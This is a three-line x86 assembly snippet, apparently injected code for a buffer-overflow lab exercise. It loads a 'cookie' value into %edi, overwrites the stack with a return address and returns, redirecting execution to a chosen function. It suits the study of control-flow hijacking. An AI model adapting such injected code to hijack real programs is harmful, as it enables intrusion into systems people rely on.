	movl $0xd060, %edi	# mov the cookie
	movl $0x401ae0, (%esp)  # mov return addr to sp
	ret
	